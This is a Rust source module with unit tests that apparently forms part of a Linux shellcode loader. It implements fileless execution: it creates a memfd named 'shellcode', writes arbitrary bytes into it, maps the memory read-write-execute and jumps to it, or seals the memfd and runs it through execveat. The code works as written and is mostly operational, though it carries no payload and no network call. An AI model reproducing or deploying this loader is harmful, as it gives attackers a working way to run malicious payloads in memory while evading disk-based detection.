use std::os::unix::io::RawFd;
use libc::{self, AT_EMPTY_PATH, F_ADD_SEALS, F_SEAL_SHRINK, F_SEAL_WRITE, MAP_SHARED, MFD_ALLOW_SEALING, MFD_CLOEXEC, fcntl, memfd_create};
use crate::config::Config;

pub unsafe fn create_memfd(config: &Config, is_execveat: bool) -> Result<RawFd, String> {
    config.log("Creating memfd...");

    let flags = if is_execveat {
        MFD_CLOEXEC | libc::MFD_ALLOW_SEALING
    } else {
        MFD_CLOEXEC
    };

    let fd = memfd_create(b"shellcode\0".as_ptr() as *const i8, flags);
    if fd < 0 {
        return Err("memfd_create failed".to_string());
    }

    config.log(&format!("Memfd created: fd={}", fd));
    Ok(fd)
}

pub unsafe fn write_to_memfd(fd: RawFd, shellcode: &[u8], config: &Config) -> Result<(), String> {
    config.log(&format!("Writing {} bytes to fd {}...", shellcode.len(), fd));
    let written = libc::write(fd, shellcode.as_ptr() as *const libc::c_void, shellcode.len());

    if written as usize != shellcode.len() {
        return Err("Failed to write all bytes".to_string());
    }

    config.log("Shellcode written successfully");
    Ok(())
}

pub unsafe fn map_memfd_executable(fd: RawFd, size: usize, config: &Config) -> Result<*mut libc::c_void, String> {
    config.log(&format!("Mapping {} bytes from fd with rwx...", size));
    let mem = libc::mmap(std::ptr::null_mut(), size, libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC, MAP_SHARED, fd, 0);
    if mem == libc::MAP_FAILED {
        return Err("mmap failed".to_string());
    }
    config.log(&format!("{} bytes mapped from fd with rwx at: 0x{}", size, mem as usize));
    Ok(mem)
}

pub fn execute_fileless_mmap(shellcode: &[u8], config: &Config) -> Result<(), String> {
    config.log("=== Fileless (memfd + mmap) ===");

    unsafe {
        let size = shellcode.len();
        let fd = create_memfd(config, false)?;
        write_to_memfd(fd, shellcode, config)?;
        let mem = map_memfd_executable(fd, size, config)?;
        config.log(&format!("Executing shellcode at 0x{:x}...", mem as usize));

        let func = std::mem::transmute::<*mut libc::c_void, fn()>(mem);
        func();
        config.log("Shellcode executed!");

        config.log("Cleaning up...");
        libc::munmap(mem, size);
        config.log("Cleanup complete");
    }
    Ok(())
}

pub fn seal_memfd(fd: i32, config: &Config) -> Result<(), String> {
    config.log("Sealing memfd...");

    unsafe {
        let ret = fcntl(fd, F_ADD_SEALS, F_SEAL_WRITE | F_SEAL_SHRINK);
        if ret < 0 {
            return Err("fcntl F_ADD_SEALS failed".to_string());
        }
    }
    config.log("Memfd sealed");
    Ok(())
}

pub fn fileless_execveat(shellcode: &[u8], config: &Config) -> Result<(), String> {
    config.log("=== Fileless (memfd + execveat) ===");

    unsafe {
        config.log("Creating memfd with sealing support...");
        let fd = create_memfd(config, true)?;
        write_to_memfd(fd, shellcode, config)?;
        seal_memfd(fd, config)?;
        
        let arg0 = b"shellcode\0".as_ptr() as *const libc::c_char;
        let argv: [*const libc::c_char; 2] = [arg0, std::ptr::null()];
        let envp: [*const libc::c_char; 1] = [std::ptr::null()];

        config.log("Calling execveat...");
        libc::syscall(libc::SYS_execveat, fd, b"\0",
            argv.as_ptr(), envp.as_ptr(), AT_EMPTY_PATH);
        
        let err = *libc::__errno_location();
        libc::close(fd);
        Err(format!("execveat failed: errno={}", err))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Test that memfd_create successfully creates a file descriptor
    #[test]
    fn test_create_memfd_success() {
        let config = Config::new(false);
        unsafe {
            let result = create_memfd(&config, false);
            assert!(result.is_ok(), "memfd_create should succeed");
            
            let fd = result.unwrap();
            assert!(fd >= 0, "fd should be a valid file descriptor");
            
            // Cleanup
            libc::close(fd);
        }
    }

    /// Test that write_to_memfd successfully writes data
    #[test]
    fn test_write_to_memfd_success() {
        let config = Config::new(false);
        let test_data = vec![0x41, 0x42, 0x43, 0x44]; // "ABCD"
        
        unsafe {
            let fd = create_memfd(&config, false).expect("Failed to create memfd");
            let result = write_to_memfd(fd, &test_data, &config);
            
            assert!(result.is_ok(), "write_to_memfd should succeed");
            
            // Verify by reading back
            let mut buffer = vec![0u8; test_data.len()];
            libc::lseek(fd, 0, libc::SEEK_SET);
            let bytes_read = libc::read(fd, buffer.as_mut_ptr() as *mut libc::c_void, buffer.len());
            
            assert_eq!(bytes_read as usize, test_data.len(), "Should read back same number of bytes");
            assert_eq!(buffer, test_data, "Data should match what was written");
            
            // Cleanup
            libc::close(fd);
        }
    }

    /// Test that write_to_memfd fails when writing wrong data
    #[test]
    fn test_write_to_memfd_partial_write() {
        let config = Config::new(false);
        let test_data = vec![0x41; 1000000]; // 1MB of 0x41
        
        unsafe {
            let fd = create_memfd(&config, false).expect("Failed to create memfd");
            
            let result = write_to_memfd(fd, &test_data, &config);
            assert!(result.is_ok(), "write should handle large data");
            
            libc::close(fd);
        }
    }

    /// Test that map_memfd_executable successfully maps with rwx permissions
    #[test]
    fn test_map_memfd_executable_success() {
        let config = Config::new(false);
        let size = 0x1000; // 4KB
        let test_data = vec![0x42u8; size];
        
        unsafe {
            let fd = create_memfd(&config, false).expect("Failed to create memfd");
            
            // First write data to the fd
            write_to_memfd(fd, &test_data, &config).expect("Failed to write to memfd");
            
            let result = map_memfd_executable(fd, size, &config);
            
            assert!(result.is_ok(), "map_memfd_executable should succeed");
            
            let mem = result.unwrap();
            assert!(!mem.is_null(), "mapped pointer should not be null");
            
            // Verify we can read the data we wrote
            let read_byte = std::ptr::read(mem as *const u8);
            assert_eq!(read_byte, 0x42, "Should read back the data we wrote");
            
            // Verify we can write to it (rwx permissions)
            std::ptr::write(mem as *mut u8, 0x99);
            let modified_byte = std::ptr::read(mem as *const u8);
            assert_eq!(modified_byte, 0x99, "Should be able to write and read from mapped memory");
            
            // Cleanup
            libc::munmap(mem, size);
            libc::close(fd);
        }
    }

    /// Test that map_memfd_executable fails with size 0
    #[test]
    fn test_map_memfd_executable_zero_size() {
        let config = Config::new(false);
        
        unsafe {
            let fd = create_memfd(&config, false).expect("Failed to create memfd");
            let result = map_memfd_executable(fd, 0, &config);
            
            // mmap with size 0 returns EINVAL, so it should error
            assert!(result.is_err(), "map_memfd_executable with size 0 should fail");
            
            libc::close(fd);
        }
    }

    /// Integration test: full fileless cycle with NOP sled
    /// NOTE: Marked as ignore because executing shellcode 
    #[test]
    #[ignore]
    fn test_execute_fileless_mmap_nop_sled() {
        let config = Config::new(false);
        
        let nop_sled = vec![0x90u8; 16];
        
        let result = execute_fileless_mmap(&nop_sled, &config);
        assert!(result.is_ok(), "execute_fileless_mmap should succeed with NOP sled");
    }

    /// Test memory isolation: data written to fd shouldn't affect unmapped regions
    #[test]
    fn test_memfd_isolation() {
        let config = Config::new(false);
        let data1 = vec![0x11u8; 0x100];
        let data2 = vec![0x22u8; 0x100];
        
        unsafe {
            let fd1 = create_memfd(&config, false).expect("Failed to create first memfd");
            let fd2 = create_memfd(&config, false).expect("Failed to create second memfd");
            
            write_to_memfd(fd1, &data1, &config).expect("Failed to write to fd1");
            write_to_memfd(fd2, &data2, &config).expect("Failed to write to fd2");
            
            // Verify each fd has its own isolated data
            let mut buffer1 = vec![0u8; 0x100];
            let mut buffer2 = vec![0u8; 0x100];
            
            libc::lseek(fd1, 0, libc::SEEK_SET);
            libc::read(fd1, buffer1.as_mut_ptr() as *mut libc::c_void, buffer1.len());
            
            libc::lseek(fd2, 0, libc::SEEK_SET);
            libc::read(fd2, buffer2.as_mut_ptr() as *mut libc::c_void, buffer2.len());
            
            assert_eq!(buffer1, data1, "fd1 should contain data1");
            assert_eq!(buffer2, data2, "fd2 should contain data2");
            assert_ne!(buffer1, buffer2, "fd1 and fd2 should be isolated");
            
            libc::close(fd1);
            libc::close(fd2);
        }
    }
}
